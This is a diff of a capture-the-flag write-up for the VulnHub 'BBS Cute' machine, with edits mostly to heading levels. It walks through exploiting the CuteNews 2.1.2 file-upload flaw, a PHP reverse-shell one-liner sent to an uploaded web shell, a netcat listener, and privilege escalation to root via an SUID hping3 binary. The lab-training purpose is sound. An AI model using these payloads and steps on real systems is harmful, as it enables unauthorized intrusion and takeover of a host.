@@ -3,8 +3,10 @@ layout: post
 author: H4
 ---
 
-# discovery
-## portscan
+# PG VULNHUB BBS Cute
+[Details](https://www.vulnhub.com/entry/bbs-cute-102,567/)
+## discovery
+### portscan
 ```bash
 $ nmap -Pn 192.168.55.128
 ```
@@ -14,13 +16,13 @@ $ nmap -Pn 192.168.55.128
 - 110 (pop3)
 - 995 (pop3)
 
-## web application
+### web application
 - use some kind of dirbuster like gobuster or dirb to identify the `index.php`
 - cutenews 2.1.2 is installed on the target
 
 ---
 
-# exploitation
+## exploitation
 ```cutenews 2.1.2 is vulnerable to an rce via file upload (https://www.exploit-db.com/exploits/48800)```
 
 - register a new account
@@ -136,10 +138,10 @@ GIF8;\nwww-data
 
 ---
 
-# post exploitation
-## get reverse shell
+## post exploitation
+### get reverse shell
 payload: ```php -r '$sock=fsockopen("192.168.49.89",443);exec("/bin/sh -i <&3 >&3 2>&3");'```
-### request 
+#### request 
 ```http
 GET /uploads/avatar_hacker_shell.php?cmd=php+-r+'$sock%3dfsockopen("192.168.49.55",443)%3bexec("/bin/sh+-i+<%263+>%263+2>%263")%3b' HTTP/1.1
 Host: 192.168.55.128
@@ -152,7 +154,7 @@ Cookie: CUTENEWS_SESSION=qujdjltcojbtb3glgfsc3guqum
 Connection: close
 ````
 
-### listener
+#### listener
 ```bash
 $ nc -lvp 443
 listening on [any] 443 ...
@@ -163,7 +165,7 @@ $ whoami
 www-data
 ```
 
-## get first flag
+### get first flag
 ```bash
 $ pwd
 /var/www
@@ -172,7 +174,7 @@ $ cat local.txt
 ```
 -> ```13e7c6be29c*********413f552260ec```
 
-## priv esc
+### priv esc
 look for SUID binaries
 ```bash
 $ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
@@ -185,7 +187,7 @@ hping3> /bin/sh -p
 root
 ```
 
-## get second flag
+### get second flag
 ```bash
 # cd /root
 # ls
